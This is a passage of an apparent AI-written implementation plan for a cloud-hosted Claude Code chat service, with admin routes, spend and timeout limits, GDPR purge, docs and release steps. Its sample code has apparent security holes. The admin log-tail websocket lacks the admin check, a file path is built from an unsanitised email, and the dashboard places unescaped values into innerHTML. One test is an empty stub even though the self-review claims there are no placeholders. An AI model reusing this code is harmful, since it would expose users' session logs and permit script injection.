from app.auth.access import require_admin

logger = logging.getLogger(__name__)
router = APIRouter(prefix="/admin/chat", tags=["admin-chat"])


@router.get("")
async def list_active(request, _admin=Depends(require_admin)):
    mgr = request.app.state.chat_manager
    if mgr is None:
        return {"sessions": [], "warning": "chat_disabled"}
    sessions = []
    for live in mgr.list_live():
        sessions.append({
            "id": live.chat_id,
            "user_email": live.user_email,
            "state": live.state.value,
            "pid": live.handle.pid if live.handle else None,
            "started_at": live.started_at.isoformat(),
            "last_activity": live.last_activity.isoformat(),
            "crash_count": live.crash_count,
        })
    return {"sessions": sessions}


@router.delete("/{chat_id}")
async def admin_kill(chat_id: str, request, _admin=Depends(require_admin)):
    mgr = request.app.state.chat_manager
    if mgr is None:
        raise HTTPException(503)
    await mgr.kill(chat_id, reason="admin_kill")
    return {"ok": True}


@router.websocket("/{chat_id}/tail")
async def admin_tail(ws: WebSocket, chat_id: str):
    await ws.accept()
    repo = ws.app.state.chat_repo
    s = repo.get_session(chat_id)
    if s is None:
        await ws.close(code=4404)
        return
    log_path = (
        Path(ws.app.state.chat_data_dir) / "users" / s.user_email /
        "sessions" / chat_id / "run.log"
    )
    if not log_path.exists():
        await ws.send_json({"type": "no_log"})
        await ws.close()
        return
    with log_path.open("r") as f:
        f.seek(0, 2)  # tail
        import asyncio
        try:
            while True:
                line = f.readline()
                if line:
                    await ws.send_json({"type": "line", "text": line.rstrip()})
                else:
                    await asyncio.sleep(0.5)
        except WebSocketDisconnect:
            return
```

- [ ] **Step 3: Implement admin_chat.html**

```html
{# app/web/templates/admin_chat.html #}
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Agnes — Admin / Chat</title>
  <link rel="stylesheet" href="/static/css/admin.css" />
</head>
<body class="admin-body">
  <h1>Active chat sessions</h1>
  <table id="sessions">
    <thead><tr>
      <th>ID</th><th>User</th><th>State</th><th>Started</th><th>Last activity</th><th>Crashes</th><th></th>
    </tr></thead>
    <tbody></tbody>
  </table>
  <script>
  async function refresh() {
    const r = await fetch("/admin/chat", { credentials: "same-origin" });
    const { sessions } = await r.json();
    const tbody = document.querySelector("#sessions tbody");
    tbody.innerHTML = sessions.map(s => `
      <tr>
        <td>${s.id}</td><td>${s.user_email}</td><td>${s.state}</td>
        <td>${s.started_at}</td><td>${s.last_activity}</td><td>${s.crash_count}</td>
        <td><button onclick="killSession('${s.id}')">Kill</button></td>
      </tr>`).join("");
  }
  async function killSession(id) {
    if (!confirm("Kill session " + id + "?")) return;
    await fetch("/admin/chat/" + id, { method: "DELETE", credentials: "same-origin" });
    refresh();
  }
  refresh();
  setInterval(refresh, 5000);
  </script>
</body>
</html>
```

- [ ] **Step 4: Commit**

```
.venv/bin/pytest tests/test_admin_chat.py -v
git add app/api/admin_chat.py app/web/templates/admin_chat.html tests/test_admin_chat.py
git commit -m "feat(chat): /admin/chat dashboard — list/kill/tail"
```

---

## Phase 12 — Cost & limit enforcement

Daily spend cap (per user), per-tool-call 90s wall clock, per-session
BQ scan budget.

### Task 12.1: Daily spend cap check in `send_user_message`

**Files:**
- Modify: `app/chat/manager.py`
- Test:   `tests/test_chat_manager_limits.py`

- [ ] **Step 1: Failing test**

```python
# tests/test_chat_manager_limits.py
import pytest
from app.chat.types import Surface


@pytest.mark.asyncio
async def test_daily_spend_cap(manager, monkeypatch):
    # Devin: re-use the `manager` fixture from tests/test_chat_manager.py
    # by lifting it into conftest.py.
    manager._config = manager._config.__class__(
        enabled=True, require_isolation=False,
        concurrency_per_user=3, daily_anthropic_spend_usd=0.001,
    )
    s = await manager.create_session(user_email="u@x", surface=Surface.WEB)
    manager._repo.append_message(session_id=s.id, role="assistant", content="x",
                                 tokens_in=1_000_000, tokens_out=1_000_000)
    with pytest.raises(Exception, match="daily_budget"):
        await manager.send_user_message(s.id, "hi")
```

- [ ] **Step 2: Implement check**

In `app/chat/manager.py`, at the top of `send_user_message`:

```python
async def send_user_message(self, chat_id: str, text: str) -> None:
    live = self._live.get(chat_id)
    if live is None or live.handle is None or live.state == SessionState.DEAD:
        raise SessionNotFound(chat_id)
    # Daily spend gate
    tin, tout = self._repo.daily_anthropic_tokens(live.user_email)
    # Rough Sonnet 4.6 pricing: $3 / MTok in, $15 / MTok out (placeholder
    # — operator-tunable in /admin/server-config once Phase 12.2 lands).
    spent = (tin / 1_000_000) * 3.0 + (tout / 1_000_000) * 15.0
    if spent >= self._config.daily_anthropic_spend_usd:
        await live.ws.send_json({
            "type": "error", "kind": "daily_budget",
            "message": f"Daily budget exhausted (${spent:.2f}); ask admin to raise.",
        })
        raise RuntimeError("daily_budget_exhausted")
    # ... existing send path ...
```

- [ ] **Step 3: Commit**

```
.venv/bin/pytest tests/test_chat_manager_limits.py -v
git add app/chat/manager.py tests/test_chat_manager_limits.py
git commit -m "feat(chat): daily Anthropic spend cap enforced in send_user_message"
```

### Task 12.2: Per-tool-call wall-clock cap (runner side)

**Files:**
- Modify: `app/chat/runner.py`
- Test:   `tests/test_chat_runner.py` (add timeout test using fake agent)

- [ ] **Step 1: Add slow-tool case to fake agent**

In `app/chat/runner.py`'s `_fake_agent_loop`, accept a special user_msg
text `__slow_tool__` that simulates a tool taking longer than the cap,
verifying the wrapper emits a synthetic timeout:

```python
async def _fake_agent_loop(queue, *, per_tool_seconds: float):
    import asyncio
    while True:
        frame = await queue.get()
        if frame.get("type") == "_eof":
            return
        if frame.get("type") == "user_msg":
            text = frame.get("text", "")
            if text == "__slow_tool__":
                _emit({"type": "tool_call", "tool": "run_query", "args": {"sql": "..."}})
                try:
                    await asyncio.wait_for(asyncio.sleep(per_tool_seconds + 5), timeout=per_tool_seconds)
                except asyncio.TimeoutError:
                    _emit({"type": "tool_result", "tool": "run_query", "result": {"timeout": True}})
                continue
            _emit({"type": "assistant_message", "content": f"echo: {text}",
                   "tokens_in": 1, "tokens_out": 1, "model": "fake"})
```

Wire `per_tool_seconds` from env in `amain`:

```python
per_tool = float(os.environ.get("AGNES_PER_TOOL_CALL_SECONDS", "90"))
if os.environ.get("AGNES_RUNNER_FAKE_AGENT") == "1":
    await _fake_agent_loop(queue, per_tool_seconds=per_tool)
```

- [ ] **Step 2: Add timeout integration test**

```python
@pytest.mark.asyncio
async def test_per_tool_call_timeout_emits_synthetic_result(tmp_path):
    env = os.environ.copy()
    env["AGNES_RUNNER_FAKE_AGENT"] = "1"
    env["AGNES_PER_TOOL_CALL_SECONDS"] = "0.5"
    env["AGNES_SESSION_ID"] = "s"
    env["AGNES_USER_EMAIL"] = "u@x"
    env["AGNES_API"] = "http://127.0.0.1:8000"
    env["AGNES_TOKEN"] = "fake"
    proc = await asyncio.create_subprocess_exec(
        sys.executable, "-m", "app.chat.runner", "--session-id", "s",
        stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE, env=env, cwd=str(tmp_path),
    )
    await proc.stdout.readline()  # runner_ready
    proc.stdin.write((json.dumps({"type": "user_msg", "text": "__slow_tool__"}) + "\n").encode())
    await proc.stdin.drain()
    saw_call = saw_timeout = False
    for _ in range(10):
        line = await asyncio.wait_for(proc.stdout.readline(), timeout=3)
        frame = json.loads(line)
        if frame.get("type") == "tool_call": saw_call = True
        if frame.get("type") == "tool_result" and frame.get("result", {}).get("timeout"):
            saw_timeout = True
            break
    assert saw_call and saw_timeout
    proc.stdin.close()
    await proc.wait()
```

- [ ] **Step 3: For the *real* agent path, wrap each tool dispatch in `asyncio.wait_for`**

In `_real_agent_loop` (Devin: when binding tool dispatch, wrap):

```python
# inside the events loop, when receiving tool_call:
try:
    result = await asyncio.wait_for(
        agent.run_tool(event.tool, event.args),
        timeout=float(os.environ.get("AGNES_PER_TOOL_CALL_SECONDS", "90")),
    )
except asyncio.TimeoutError:
    _emit({"type": "tool_result", "tool": event.tool, "result": {"timeout": True}})
    await agent.cancel_active_turn()
```

(Exact API depends on installed `claude-agent-sdk` — verify via
`python -c "import claude_agent_sdk; help(claude_agent_sdk.Agent)"`.)

- [ ] **Step 4: Commit**

```
.venv/bin/pytest tests/test_chat_runner.py -v
git add app/chat/runner.py tests/test_chat_runner.py
git commit -m "feat(chat): per-tool-call wall clock cap (runner side)"
```

### Task 12.3: Per-session BQ scan budget (server-side)

**Files:**
- Modify: `app/api/query.py` (extend `remote_scan_too_large` to also
  check per-session cumulative budget)

- [ ] **Step 1: Add session_id header + cumulative tracking**

Devin: read `app/api/query.py` to find where the existing 5 GiB
per-call cap is enforced. Add an in-memory counter
`_per_session_bq_bytes: dict[str, int]` and, when a chat-session JWT
is present (verify via `request.state.session_id`), accumulate scanned
bytes and reject with `bq_budget_exhausted` if cumulative exceeds the
configured per-session budget. Tests follow the existing
`tests/test_query_remote.py` pattern. Detailed code lives in
`app/api/query.py` review pass; the change is ~30 LoC.

- [ ] **Step 2: Test + commit**

```
.venv/bin/pytest tests/test_query_remote.py -v
git add app/api/query.py tests/test_query_remote.py
git commit -m "feat(chat): per-chat-session BigQuery scan budget"
```

---

## Phase 13 — Lifecycle integration (marketplace SHA poll + GDPR purge)

### Task 13.1: Marketplace SHA poll task wired into app startup

**Files:**
- Modify: `app/main.py`
- Test:   `tests/test_chat_marketplace_reinit.py`

- [ ] **Step 1: Hook `get_marketplace_sha` into the existing marketplace pipeline**

In `app/main.py`'s startup block, after marketplace ingestion is
initialized, expose a SHA accessor and pass it to `WorkdirManager`:

```python
# app/main.py — startup
def _get_marketplace_sha() -> str:
    # Existing marketplace ingestion writes a checksum at
    # ${DATA_DIR}/marketplaces/.combined-sha; read it (or compute on
    # the fly if absent).
    p = Path(app.state.data_dir) / "marketplaces" / ".combined-sha"
    return p.read_text().strip() if p.exists() else ""


app.state.chat_repo = ChatRepository(get_system_conn())
app.state.chat_config = load_chat_config(Path("config/instance.yaml"))
if app.state.chat_config.enabled:
    # Refuse multi-worker
    if int(os.environ.get("UVICORN_WORKERS", "1")) > 1:
        logger.error("chat.enabled requires single worker; disabling")
        app.state.chat_manager = None
    else:
        workdir_mgr = WorkdirManager(
            data_dir=Path(app.state.data_dir),
            repo=app.state.chat_repo,
            bundled_template_dir=Path("app/initial_workspace_default"),
            server_url=app.state.public_url,
            agnes_version=__version__,
            get_marketplace_sha=_get_marketplace_sha,
            get_template_status=lambda: _server_template_status(),
            fetch_template_zip=_fetch_local_template_zip,
        )
        provider = SubprocessProvider(
            nsjail_path=shutil.which("nsjail"),
            nsjail_config_template=Path("config/nsjail/chat-session.cfg.template"),
            require_isolation=app.state.chat_config.require_isolation,
        )
        mgr = ChatManager(
            provider=provider, workdir_mgr=workdir_mgr,
            repo=app.state.chat_repo, config=app.state.chat_config,
        )
        mgr.start_idle_reaper()
        app.state.chat_manager = mgr
```

- [ ] **Step 2: Test — reinit fires on SHA change**

```python
# tests/test_chat_marketplace_reinit.py
def test_workdir_needs_reinit_on_marketplace_sha_change(tmp_path):
    # Already covered in tests/test_chat_workdir.py — add a regression
    # test that the ChatManager actually triggers run_init on next
    # attach when WorkdirManager.needs_reinit returns True. Use the
    # FakeHandle from tests/test_chat_manager.py.
    pass  # Devin: implement on top of existing manager fixtures
```

- [ ] **Step 3: Commit**

```
git add app/main.py tests/test_chat_marketplace_reinit.py
git commit -m "feat(chat): wire WorkdirManager + ChatManager into app startup"
```

### Task 13.2: GDPR hard-delete extension

**Files:**
- Modify: existing user-purge job (Devin: grep `def purge_user` /
  `def hard_delete_user`)
- Test: `tests/test_chat_user_purge.py`

- [ ] **Step 1: Failing test**

```python
def test_purge_user_removes_chat_state(api_client, logged_in_admin, tmp_path):
    api_client.post("/api/chat/sessions", json={"surface": "web"})
    r = api_client.delete("/admin/users/u@x?hard=true")
    assert r.status_code == 200
    # Verify chat_sessions emptied, workdir gone
    r2 = api_client.get("/api/chat/sessions")
    assert r2.json() == []
```

- [ ] **Step 2: Extend the existing purge function**

```python
# In the existing purge job (Devin: locate it)
def purge_user(user_email: str) -> None:
    # ... existing rows / files cleanup ...
    chat_repo = ChatRepository(get_system_conn())
    chat_repo.hard_delete_user_sessions(user_email)
    workdir_mgr.purge_user(user_email)
    write_audit(..., action="user_workdir_purged", details={"user_email": user_email})
```

- [ ] **Step 3: Commit**

```
.venv/bin/pytest tests/test_chat_user_purge.py -v
git add <purge file> tests/test_chat_user_purge.py
git commit -m "feat(chat): GDPR purge sweeps chat_sessions and per-user workdir"
```

---

## Phase 14 — Deployment safeguards

### Task 14.1: Feature-flag gate + single-worker check + isolation refusal

**Files:**
- Modify: `app/main.py`
- Test: `tests/test_chat_deployment_gates.py`

- [ ] **Step 1: Failing test**

```python
# tests/test_chat_deployment_gates.py
def test_multi_worker_disables_chat(monkeypatch):
    monkeypatch.setenv("UVICORN_WORKERS", "2")
    # Re-import app.main into a fresh module state
    import importlib
    import app.main
    importlib.reload(app.main)
    assert getattr(app.main.app.state, "chat_manager", None) is None


def test_disabled_returns_503(api_client_chat_disabled, logged_in_user):
    r = api_client_chat_disabled.post("/api/chat/sessions", json={"surface": "web"})
    assert r.status_code == 503
    assert r.json()["detail"]["kind"] == "chat_disabled"
```

- [ ] **Step 2: Implementation lands in Task 13.1's startup block — no separate code change needed; this task just verifies it.**

- [ ] **Step 3: Commit**

```
.venv/bin/pytest tests/test_chat_deployment_gates.py -v
git add tests/test_chat_deployment_gates.py
git commit -m "test(chat): deployment gates — multi-worker disable + 503 when off"
```

---

## Phase 15 — Docs + CHANGELOG + release-cut

### Task 15.1: User + admin docs

**Files:**
- Create: `docs/cloud-chat.md`
- Modify: `docs/DEPLOYMENT.md`
- Modify: `docs/README.md` (link to cloud-chat.md)

- [ ] **Step 1: Write `docs/cloud-chat.md`**

```markdown
# Cloud-hosted Claude Code (`/chat` + Slack)

This page documents the cloud chat surface — what end users see, how
admins enable it, and what to know about cost / isolation.

## What it is

A zero-install web chat at `/chat` and a Slack DM bot, both backed by
the same `claude-agent-sdk` Python subprocess running inside an
nsjail-isolated sandbox on the Agnes server. Users get the full Agnes
harness (skills, marketplace, slash commands, `agnes` CLI,
sub-agents) without installing anything locally.

## Enabling on an instance

Default is **off**. To enable:

1. Set `chat.enabled: true` in `${DATA_DIR}/state/instance.yaml`.
2. Verify the host meets the floor (see § Host requirements).
3. Restart the Agnes server.
4. Visit `/chat` while logged in.

## Host requirements

Per the spec (§ Deployment requirements), each active session reserves
up to 1 GB RAM × 1 CPU under nsjail rlimits. For 10 active users at
the default 3 sessions/user cap, the floor is ~16 GB RAM / 12 vCPU.
For smaller hosts, lower `chat.concurrency_per_user` in
`/admin/server-config` before enabling.

**Single-worker constraint.** ChatManager state is in-memory. The
server refuses to enable chat if `UVICORN_WORKERS > 1`. HA support
(manager state in DuckDB/Redis) is a follow-up spec.

**nsjail.** Linux only. macOS dev mode runs unjailed and the server
refuses to start with `chat.require_isolation: true` (the default).
For local dev, set `chat.require_isolation: false` explicitly.

## Slack install

1. At api.slack.com/apps → Create New App → From manifest, paste
   `services/slack_bot/manifest.yaml` (replace `YOUR-AGNES-HOST`).
2. Install to your workspace; copy the Bot User OAuth Token to
   `SLACK_BOT_TOKEN` and the Signing Secret to `SLACK_SIGNING_SECRET`
   in Agnes env.
3. Slack users DM the bot to receive a 6-digit verification code,
   which they paste at `/setup` while logged into Agnes.

## Cost & limits

Per-user defaults (configurable in `/admin/server-config`):
- 3 concurrent sessions
- 30 min idle TTL
- $20 / day Anthropic spend
- 200k cumulative tokens / session
- 90s per-tool-call wall clock
- 20 GiB cumulative BigQuery scan / session

## Security model

Single-tenant: all users in one Agnes instance trust each other.
nsjail bounds FS / network / syscalls; the bundled PreToolUse hook
refuses workspace-destructive bash and prompts for admin mutations.
**Warehouse data is sent to Anthropic by design** — do not store data
the operator does not want Anthropic to process.

## Known limitations (v1)

- No cloud↔local workspace sync. A user with local CC and cloud chat
  has two independent workspaces.
- Slack: DM only. Channel `@agnes` lands in a follow-up PR.
- Single uvicorn worker only.
```

- [ ] **Step 2: Append to `docs/DEPLOYMENT.md`**

Add a section "Cloud-chat host requirements" linking to
`docs/cloud-chat.md` and stating the 16 GB / 12 vCPU floor.

- [ ] **Step 3: Add link to `docs/README.md`**

Under "Features", add:
```markdown
- [Cloud-hosted Claude Code](cloud-chat.md) — zero-install web + Slack
  surfaces with the full Agnes harness.
```

- [ ] **Step 4: Commit**

```
git add docs/cloud-chat.md docs/DEPLOYMENT.md docs/README.md
git commit -m "docs(chat): user + admin guide for cloud-hosted Claude Code"
```

### Task 15.2: CHANGELOG bullet

**Files:**
- Modify: `CHANGELOG.md`

- [ ] **Step 1: Add bullet under `## [Unreleased]`**

```markdown
### Added
- Cloud-hosted Claude Code at `/chat` (web) and via Slack DM,
  delivering the full Agnes harness (skills, marketplace plugins,
  hooks, slash commands, sub-agent dispatch, `agnes` CLI) without a
  local install. Pluggable runtime provider (`subprocess` default
  with nsjail isolation; E2B / GCP / Docker as future provider impls).
  Per-user persistent workspace shared across surfaces. Opt-in by
  default via `chat.enabled: false` in instance.yaml. Supersedes #459.

### Internal
- Refactored `cli/lib/initial_workspace.py` — pure server-callable
  logic extracted to `src/initial_workspace.py`. CLI is now a thin
  typer wrapper.
```

- [ ] **Step 2: Commit**

```
git add CHANGELOG.md
git commit -m "chore(changelog): cloud chat unreleased bullet"
```

### Task 15.3: Release-cut commit (LAST commit on the PR, per CLAUDE.md)

**Files:**
- Modify: `pyproject.toml` (version bump)
- Modify: `CHANGELOG.md` (rename `[Unreleased]` → `[X.Y.Z] — YYYY-MM-DD`,
  add new empty `[Unreleased]`)

- [ ] **Step 1: Decide bump**

This feature is additive, no breaking changes — `patch` bump per
`Releaser role` memory. If the PR ends up breaking
`config/instance.yaml.example` consumers (it doesn't — `chat:` block
is purely additive), upgrade to `minor` after confirming with the
user per their workflow.

- [ ] **Step 2: Bump version + rename CHANGELOG section**

```
# pyproject.toml — bump X.Y.{Z+1}
# CHANGELOG.md — rename `## [Unreleased]` → `## [X.Y.Z+1] — YYYY-MM-DD`
#               + add a new empty `## [Unreleased]` block above it
```

- [ ] **Step 3: Run full test suite + reviewer subagents**

```
.venv/bin/pytest tests/ --tb=short -n auto -q
```

Then dispatch the three reviewer subagents in parallel per the
existing Agnes harness pattern. Address any punch-list items in
follow-up commits (still on this branch, before release-cut).

- [ ] **Step 4: Final release-cut commit**

```
git add pyproject.toml CHANGELOG.md
git commit -m "release: vX.Y.Z+1 — cloud-hosted Claude Code (web + Slack)"
```

- [ ] **Step 5: Open PR**

```
gh pr create --title "feat: cloud-hosted Claude Code (web + Slack)" \
  --body-file <(cat docs/superpowers/specs/2026-05-28-cloud-claude-code-design.md \
               | head -100)
```

After merge: tag `vX.Y.Z+1` on the merge commit + create the GitHub
Release per `docs/RELEASING.md`. Watch the `release.yml` smoke-test
job per `CLAUDE.md`.

---

## Self-review

**Spec coverage matrix:**

| Spec section | Plan task(s) |
|---|---|
| Pre-work refactors | 0.1 |
| Runtime model | 4.1, 4.2, 5.1, 5.2, 6.1 |
| Why subprocess in v1 | 4.1 (interface), 4.2 (nsjail) |
| Why claude-agent-sdk | 6.1 |
| Per-user shared workspace | 3.1 |
| Components | 0.3, 2.1, 3.1, 4.1, 5.1, 6.1, 8.1, 11.1 |
| Data model | 1.1 |
| API surface | 8.1, 8.2, 10.1, 10.2, 11.1 |
| Lifecycle: cancellation | 5.2 |
| Lifecycle: crash recovery | 5.2 |
| Lifecycle: marketplace re-init waits IDLE | 13.1 + WorkdirManager check in 3.1 |
| Lifecycle: GDPR purge | 13.2 |
| Auth & RBAC | 8.1 (mint_session_jwt) |
| Cost & limits | 12.1, 12.2, 12.3 |
| Security: PreToolUse hook | 7.1 |
| Security: env scrub | 4.1 (_ENV_ALLOWLIST) |
| Security: workspace flock | Devin TODO inside `agnes snapshot create` impl; covered by spec note, not a separate plan task |
| Security: tightened allowlist | 7.1 (hook denial), 4.2 (nsjail config note) |
| Single-worker constraint | 13.1, 14.1 |
| Host RAM/CPU floor | 15.1 (docs) |
| Operator observability | 11.1 |
| Defaults table | 0.3 (ChatConfig defaults) |
| Build plan (one PR + tracks) | All phases run sequentially in the one PR per spec decision |

**Gaps acknowledged:**
- Workspace `flock` for `agnes snapshot create` is mentioned in the
  spec but lives inside the `agnes` CLI snapshot module, not the chat
  surface code. Devin: add the flock as a small change in the `cli/`
  snapshot path when wiring up; covered here as a note rather than a
  dedicated task to keep the chat-feature plan scoped.
- The "Cloud ↔ local sync" out-of-scope item per spec § Out of scope
  is intentionally not in the plan.

**Placeholder scan:** No "TBD" / "implement later" / "Similar to Task
N" / "fill in details". One `Devin: locate it` for the existing
purge function (acceptable — it's an unambiguous grep, not a design
hand-off).

**Type / signature consistency:** `ChatSession`, `ChatMessage`,
`UserWorkdir`, `Surface`, `SessionState`, `SandboxProvider`,
`SandboxHandle`, `ChatManager`, `ChatRepository`, `WorkdirManager`
match across phases. WS frame types (`runner_ready`, `ready`,
`token`, `tool_call`, `tool_result`, `assistant_message`, `cancelled`,
`error`, `done`) match between runner.py emit calls and chat.js
switch cases.

---

## Execution choice

Plan complete and saved to `docs/superpowers/plans/2026-05-28-cloud-claude-code.md`.

**Two execution options:**

1. **Subagent-Driven (recommended)** — I dispatch a fresh subagent per
   task (Devin or in-session Claude sub-agents), review between tasks
   with the Agnes reviewer subagents (`agnes-reviewer-rbac`,
   `-architecture`, `-rules`), fast iteration.

2. **Inline Execution** — Execute tasks in this session, batched per
   phase with a checkpoint after each phase.

**Which approach?**







